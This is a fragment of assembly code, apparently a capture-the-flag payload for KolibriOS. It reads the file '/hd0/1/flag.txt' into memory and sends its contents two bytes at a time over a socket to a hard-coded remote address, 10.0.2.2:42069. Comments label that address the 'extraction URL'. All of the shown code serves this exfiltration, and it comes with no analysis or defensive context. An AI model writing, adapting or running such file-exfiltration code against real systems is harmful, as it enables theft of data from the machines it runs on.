```assembly
; ...
; send data routine
thread:
        mcall   40, 0

        mcall   68, 12, 32768						; read flag file
        test    eax, eax
        jz      .error
        mov     [file_struct.buf], eax
        mov     [clipboard_data], eax
        mcall   70, file_struct
        cmp     eax, 6
        jne     .error
        mov     [clipboard_data_length], ebx
        mov     eax, [clipboard_data]

        jmp .loop
        
  .error:
        mov     ecx, 0xc
        mov     esi, file_error
        mov     edi, clipboard_data
        rep movsb


  ; send data to Remote
  .loop:
        mov     ebx, [counter]
        mov     esi, [clipboard_data]
        add     esi, ebx
        add     ebx, 2
        mov     [counter], ebx
        mov     ax, [esi]
        mov     [send_data], ax
        xor     esi, esi
        inc     esi
        test    al, al
        jz      done
        inc     esi
        mcall   send, [socketnum], send_data		; send data to remote URL

        invoke  con_get_flags
        jmp      .loop
; ...
socketnum       dd ?								
buffer_ptr      rb BUFFERSIZE+1						
file_error      db 'Error with file', 0xa, 0, 0		
file_done       db 'File loaded', 0xa, 0, 0			
param           db '/hd0/1/flag.txt', 0				; file to extract
send_data       dw ?
counter         dd 0
identifier              dd 0
clipboard_data          dd 0						; file data ptr
clipboard_data_length   dd 0
send_ptr                dd ?

hostname        db '10.0.2.2:42069', 0			; extraction URL 

file_struct:
        dd 0            ; read file
        dd 0            ; offset
        dd 0            ; reserved
        dd 32768        ; max file size
  .buf  dd 0            ; buffer ptr
        db 0
        dd param

mem:
```
